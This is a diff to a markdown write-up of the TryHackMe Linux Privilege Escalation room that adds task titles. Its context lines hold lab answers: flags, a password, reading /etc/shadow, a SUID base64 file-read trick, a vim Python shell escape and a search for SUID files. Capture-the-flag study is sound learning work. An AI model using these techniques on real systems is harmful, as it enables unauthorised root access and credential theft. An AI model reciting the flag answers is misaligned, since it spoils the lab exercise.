@@ -7,7 +7,7 @@ parents: ["TryHackMe"]
 
 ## Linux Privilege Escalation Room
 
-## Task 3
+## Task 3 Enumeration
 ```
 Username and Password already provided.
 ssh karen@10.10.232.44
@@ -25,7 +25,7 @@ CVE-2015-1328
 
 ```
 
-## Task 5
+## Task 5 Kernel Exploitation
 ```
 Username and Password already provided.
 ssh karen@10.10.154.17
@@ -42,7 +42,7 @@ flag: THM-28392872729920
 
 ```
 
-## Task 6
+## Task 6 SUDO
 ```
 Username and Password already provided.
 ssh karen@10.10.255.25
@@ -59,7 +59,7 @@ We can find this by catting /etc/shadow and grepping for frank.
 
 ```
 
-## Task 7
+## Task 7 SUID
 ```
 Username and Password already provided.
 ssh karen@10.10.176.74
@@ -75,7 +75,7 @@ LFILE=flag3.txt
 base64 "$LFILE" | base64 --decode
 ```
 
-## Task 8
+## Task 8 Capabilities
 ```
 Username and Password already provided.
 ssh karen@10.10.150.137
@@ -88,7 +88,7 @@ What is the content of the flag4.txt file?
 vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
 
-## Task 9
+## Task 9 Cron Jobs
 ```
 Username: karen
 Password: Password1
@@ -101,7 +101,7 @@ What is Matt's password?
 123456
 ```
 
-## Task 10
+## Task 10 Exploiting PATH environment
 ```
 What is the odd folder you have write access for?
 do an ls -halt to view directories and their accesses.
@@ -114,7 +114,7 @@ What is the content of the flag6.txt file?
 THM-736628929 
 ```
 
-## Task 11
+## Task 11 NFS
 ```
 How many mountable shares can you identify on the target system?
 cat /etc/exports
@@ -126,7 +126,7 @@ What is the content of the flag7.txt file?
 THM-89384012
 ```
 
-## Task 12
+## Task 12 Capstone
 ```
 What is the content of the flag1.txt file?
 find / -type f -perm -u=s 2>/dev/null
